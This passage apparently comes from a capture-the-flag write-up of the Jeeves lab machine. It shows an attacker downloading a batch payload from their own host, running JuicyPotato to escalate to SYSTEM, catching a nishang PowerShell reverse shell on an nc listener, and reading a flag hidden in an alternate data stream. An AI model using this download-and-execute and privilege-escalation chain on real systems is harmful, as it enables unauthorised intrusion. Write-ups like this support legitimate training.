+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\k</span>ohsuke<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>New-Object&nbsp;System.Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadFile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'http://10.10.14.12:8000/adminshell.bat'</span>,<span style="color:#3ad900;font-weight:400">'C:\Users\kohsuke\Desktop\adminshell.bat'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\k</span>ohsuke<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span><br>
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\k</span>ohsuke<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+			<br>
+			Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			-a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">/</span>31<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;&nbsp;9<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;114&nbsp;adminshell.bat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			-a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">/</span>31<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;&nbsp;&nbsp;9<span style="color:#ff9d00;font-weight:700">:</span>09&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;347648&nbsp;JuicyPotato.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			-ar---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">/</span>3<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;user.txt
+		</div>
+	</div><br>
+	<br>
+	<a id="h3-7" name="h3-7"></a><strong></strong>
+	<h3><strong>4c) JuicyPotato to SYSTEM</strong></h3><br>
+	Run JuicyPotato to exploit the system!<br>
+	<br>
+	<code>-t *</code> - to try both CreateProcessWithTokenW and CreateProcessAsUser create process calls<br>
+	<code>-p</code> - to specify the program/command to run (your .bat script)<br>
+	<code>-l</code> - to specify a random COM port to listen on<br>
+	<br>
+		<div class="codebox">
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\k</span>ohsuke<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;.<span style="color:#333333;font-weight:400">\J</span>uicyPotato.exe&nbsp;-t&nbsp;*&nbsp;-p&nbsp;adminshell.bat&nbsp;-l&nbsp;6767<br>
+			Testing&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;6767<br>
+			......<br>
+			[+]&nbsp;authresult&nbsp;0<br>
+			<span style="color:#ff9d00;font-weight:700">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span style="color:#ff9d00;font-weight:700">};</span>NT&nbsp;AUTHORITY<span style="color:#333333;font-weight:400">\S</span>YSTEM<br>
+			<br>
+			[+]&nbsp;CreateProcessWithTokenW&nbsp;OK
+		</div>
+	</div><br>
+	<br>
+	JuicyPotato ran as SYSTEM successfully!<br>
+	<br>
+	You should should see your nishang reverse shell being downloaded from your attacking machine<br>
+		<div class="codebox">
+			10.10.10.63&nbsp;-&nbsp;-&nbsp;[31<span style="color:#ff9d00;font-weight:700">/</span>Oct<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>34]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/Invoke-PowerShellTcp9003.ps1&nbsp;HTTP/1.1"</span>&nbsp;200&nbsp;-
+		</div>
+	</div><br>
+	<br>
+	And a SYTSEM shell on your listener!<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9003</span><br>
+			listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...<br>
+			connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.63]&nbsp;49697<br>
+			Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;JEEVES$&nbsp;on&nbsp;JEEVES<br>
+			Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+			<br>
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">whoami</span><br>
+			nt&nbsp;authority<span style="color:#333333;font-weight:400">\s</span>ystem
+		</div>
+	</div><br>
+	<br>
+	We're SYSTEM!<br>
+	But, according to the author, the flag is elsewhere :/<br>
+		<div class="codebox">
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span><br>
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+			<br>
+			<br>
+			Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			-ar---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">/</span>24<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;2<span style="color:#ff9d00;font-weight:700">:</span>51&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;36&nbsp;hm.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			-a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">/</span>8<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;9<span style="color:#ff9d00;font-weight:700">:</span>05&nbsp;AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;797&nbsp;Windows&nbsp;10&nbsp;Update&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Assistant.lnk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+			<br>
+			<br>
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;hm.txt&nbsp;<br>
+			The&nbsp;flag&nbsp;is&nbsp;elsewhere.&nbsp;&nbsp;Look&nbsp;deeper.
+		</div>
+	</div><br>
+	<br>
+	<a id="h2-5" name="h2-5"></a><strong></strong>
+	<h2><strong>5) Find Hidden root.txt</strong></h2><br>
+	“look deeper" made me think of Alternate Data Streams i.e. hiding files in other files.<br>
+	<a href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/</a><br>
+	<br>
+	Check for an alternate data stream in hm.txt with <code>Get-item</code> and the <code>-stream</code> flag.<br>
+		<div class="codebox">
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;Get-item&nbsp;-Path&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\h</span>m.txt&nbsp;-stream&nbsp;*<br>
+			<br>
+			FileName<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\h</span>m.txt<br>
+			<br>
+			Stream&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length<br>
+			------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------<br>
+			<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$DATA</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;36<br>
+			root.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;34
+		</div>
+	</div><br>
+	<br>
+	Looks like <code>hm.txt</code> is hiding <code>root.txt</code>.<br>
+	Go grab it.<br>
+		<div class="codebox">
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;Get-Content&nbsp;-Path&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\h</span>m.txt&nbsp;-Stream&nbsp;root.txt<br>
+			afbc5bd4b615a60648cec41c6ac92530
+		</div>
+	</div>
+    </writeup>
+</section>
+
+</body>
+</html>
